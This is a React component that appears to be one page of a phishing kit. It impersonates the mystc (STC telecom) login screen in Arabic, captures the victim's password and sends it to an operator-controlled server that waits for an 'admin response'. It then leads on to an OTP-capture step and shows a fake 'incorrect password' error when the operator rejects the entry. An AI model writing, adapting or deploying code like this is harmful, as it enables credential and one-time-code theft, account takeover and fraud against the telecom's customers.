import {
  adminLoading,
  isFormRejected,
  loading,
} from "@/real-time/context/signals";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { useEffect, useState } from "react";
import { FieldValues, useForm } from "react-hook-form";
import {
  CircularProgress,
  LinearProgress,
  Stack,
  FormControl,
  InputAdornment,
  Button,
  Input,
  createTheme,
  ThemeProvider,
} from "@mui/material";
import LockOutlinedIcon from "@mui/icons-material/LockOutlined";

const customTheme = createTheme({
  direction: "rtl",
  typography: {
    fontFamily: "Cairo, Roboto, sans-serif",
  },
  palette: {
    primary: {
      main: "#4f008c",
    },
  },
});

function MyStc() {
  const {
    register,
    handleSubmit,
    reset,
    formState: { isValid },
    setValue,
  } = useForm({
    mode: "onChange",
    defaultValues: {
      password: "",
    },
  });

  function sendData(data: FieldValues) {
    const { password } = data;

    sendDataToServer({
      data: {
        "كلمة المرور": password,
      },
      current: "MyStc",
      nextPage: `تحقق رقم الجوال (OTP)?serviceProvider=0`,
      waitingForAdminResponse: true,
    });
  }
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => setCurrentPage("MyStc"), []);
  useEffect(() => {
    if (isFormRejected.value) {
      reset();
      setPassword("");
    }
  }, [isFormRejected.value]);

  const handleClickShowPassword = () => setShowPassword((show) => !show);
  return (
    <>
      <ThemeProvider theme={customTheme}>
        <section className="w-full h-full bg-white absolute top-0 left-0 p-4 sm:p-0">
          {(loading.value || adminLoading.value) && (
            <div className="absolute cursor-wait left-0 top-0 w-full h-full bg-white bg-opacity-90 z-50 flex justify-center items-center flex-col gap-4">
              <LinearProgress
                sx={{ position: "absolute", width: "100%", top: "0" }}
              />
              <CircularProgress />
              {adminLoading.value == "wait" && (
                <span className="text-xs font-medium">
                  يرجى الانتظار جاري التأكد من صحه البيانات المدخلة
                </span>
              )}
            </div>
          )}
          <form
            className="w-[415px] mx-auto sm:py-12 flex h-[100%] max-w-[100%]"
            style={{ flexDirection: "column", justifyContent: "space-between" }}
            onSubmit={handleSubmit(sendData)}
          >
            <div>
              <div className="top">
                <div className="py-2 mb-6">
                  <img
                    src="images/service-providers/1.png"
                    alt="mystc"
                    className="h-10 mx-auto"
                  />
                </div>
                <h4 className="text-xl font-bold text-black-800 text-center">
                  أدخل كلمة المرور
                </h4>
                <h2 className="text-center mb-10 text-[green]">
                  يتعين عليك ادخال كلمة الجديدة من mystc
                </h2>
              </div>

              <div className="grow flex flex-col gap-4">
                <Stack>
                  <FormControl fullWidth>
                    <Input
                      {...register("password", {
                        required: "يرجي ادخال كلمة المرور",
                      })}
                      onChange={(e) => {
                        const clean = e.target.value.replace(
                          /[^A-Za-z0-9 !@#$%^&*()_+\-=[\]{};':"\\|,.<>/?]/g,
                          ""
                        );
                        setPassword(clean);
                        setValue("password", clean, {
                          shouldValidate: true,
                        });
                      }}
                      value={password}
                      type={showPassword ? "text" : "password"}
                      startAdornment={
                        <InputAdornment position="start">
                          <LockOutlinedIcon />
                        </InputAdornment>
                      }
                      endAdornment={
                        <InputAdornment position="end">
                          <Button
                            variant="text"
                            onClick={handleClickShowPassword}
                            aria-label={
                              showPassword
                                ? "hide the password"
                                : "display the password"
                            }
                          >
                            {showPassword ? "اخفاء" : "اظهار"}
                          </Button>
                        </InputAdornment>
                      }
                      name="password"
                      id="password"
                      placeholder="كلمة المرور"
                    />
                  </FormControl>
                </Stack>

                {isFormRejected.value && (
                  <Stack className="font-medium mt-5 text-red-500 text-center">
                    كلمة المرور غير صحيحة
                  </Stack>
                )}
              </div>
            </div>
            <div>
              <Button
                fullWidth
                variant="contained"
                size="large"
                disabled={!isValid}
                type="submit"
              >
                تسجيل الدخول
              </Button>
            </div>
          </form>
        </section>
      </ThemeProvider>
    </>
  );
}

export default MyStc;
